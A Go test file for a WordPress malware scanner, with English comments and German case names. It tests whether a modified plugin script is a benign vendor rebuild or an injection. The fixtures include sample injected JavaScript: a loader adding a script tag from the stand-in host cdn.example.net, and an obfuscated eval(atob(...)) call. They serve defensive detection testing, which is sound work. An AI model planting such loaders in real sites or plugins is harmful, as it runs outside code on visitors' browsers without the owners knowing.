package scanner

import (
	"crypto/md5"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/brightcolor/malwatch/internal/fileview"
	"github.com/brightcolor/malwatch/internal/knownfiles"
	"github.com/brightcolor/malwatch/internal/rules"
	"github.com/brightcolor/malwatch/internal/sigs"
	"github.com/brightcolor/malwatch/internal/walk"
)

// A script file of a plugin that differs from the release on wordpress.org is
// either rebuilt by its vendor or changed by someone else. jupiterx-core
// 4.60.0 on 2026-09-30: three files differed throughout, the fourth in one
// block - the package.json of Font Awesome with the npm data of the vendor's
// build machine. Injected code loads or runs a script; a rebuild does not add
// that in one place.
func TestDeviationsOfScriptFiles(t *testing.T) {
	orig := strings.Repeat("function a(e){return e+1}var cfg=JSON.parse('{\"version\":\"1.2.36\"}');", 200)
	loader := "var s=document.createElement('script');s.src='https://cdn.example.net/x.js';document.head.appendChild(s);"
	cases := []struct {
		name  string
		local string
		want  bool // true: the deviation is harmless
	}{
		{"Daten im Block geändert", strings.Replace(orig, "{\"version\":\"1.2.36\"}", "{\"_from\":\"x@^1\",\"_where\":\"/var/www/html/tom\",\"version\":\"1.2.36\"}", 1), true},
		{"durchgehend neu gebaut", strings.ReplaceAll(orig, "e+1", "1+e"), true},
		{"Lader angehängt", orig + loader, false},
		{"Lader vorangestellt", loader + orig, false},
		{"Lader vorn und hinten", loader + orig + "eval(atob('YWxlcnQoMSk='));", false},
		{"Lader in der Mitte", orig[:4000] + loader + orig[4000:], false},
		// A file replaced as a whole keeps nothing of the original, just as a
		// rebuild does. What tells them apart is what runs: a rebuild brings
		// no loader the release lacks.
		{"ganz ersetzt durch einen Lader", strings.Repeat("var q=1;", 100) + loader, false},
	}
	for _, c := range cases {
		if c.local == orig {
			t.Fatalf("%s: die Probe gleicht dem Original", c.name)
		}
		if got := harmlessDeviation([]byte(c.local), []byte(orig)); got != c.want {
			t.Errorf("%s: harmlos %v, erwartet %v", c.name, got, c.want)
		}
	}
	// A release that loads a script itself keeps doing so after a rebuild.
	withLoader := orig + loader
	if !harmlessDeviation([]byte(strings.ReplaceAll(withLoader, "e+1", "1+e")), []byte(withLoader)) {
		t.Error("durchgehend neu gebaut mit dem Lader des Originals: als Einschub gewertet")
	}
}

// scanWithOriginals scans one file of a plugin whose release file lies on a
// test server.
func scanWithOriginals(t *testing.T, original, local string) []string {
	t.Helper()
	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write([]byte(original))
	}))
	defer srv.Close()
	root := t.TempDir()
	plugin := filepath.Join(root, "wp-content", "plugins", "x")
	m := md5.Sum([]byte(original))
	known := knownfiles.New()
	known.AddVendorTree(plugin, "Plugin x 1.0", map[string]string{"assets/app.js": hex.EncodeToString(m[:])})
	known.SetOrigin(plugin, "Plugin x 1.0", srv.URL+"/x/tags/1.0/")
	p := filepath.Join(plugin, "assets", "app.js")
	if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(p, []byte(local), 0o644); err != nil {
		t.Fatal(err)
	}
	sigDB, _ := sigs.Load(filepath.Join(root, "none"))
	opts := &Options{View: fileview.Default, originals: &originFetcher{client: srv.Client(), maxBytes: 1 << 20, budget: 5}}
	f := walk.File{Path: p, Size: int64(len(local)), MTime: time.Now(), Ext: "js", Rel: "/wp-content/plugins/x/assets/app.js"}
	found, _, _ := scanFile(f, sigDB, rules.NewEngine(nil), known, opts)
	var out []string
	for _, x := range found {
		out = append(out, x.Rule)
	}
	return out
}

func TestRebuiltScriptFilesAreNoModifiedFiles(t *testing.T) {
	orig := strings.Repeat("function a(e){return e+1}var cfg=JSON.parse('{\"version\":\"1.2.36\"}');", 200)
	rebuilt := strings.Replace(orig, "{\"version\":\"1.2.36\"}", "{\"_where\":\"/var/www/html/tom\",\"version\":\"1.2.36\"}", 1)
	if rebuilt == orig {
		t.Fatal("die neu gebaute Probe gleicht dem Original")
	}
	if got := scanWithOriginals(t, orig, rebuilt); has(got, "core.modified") {
		t.Errorf("neu gebaute Datei: %v, erwartet kein core.modified", got)
	}
	injected := orig + "var s=document.createElement('script');s.src='https://cdn.example.net/x.js';"
	if got := scanWithOriginals(t, orig, injected); !has(got, "core.modified") {
		t.Errorf("Datei mit Lader: %v, erwartet core.modified", got)
	}
}
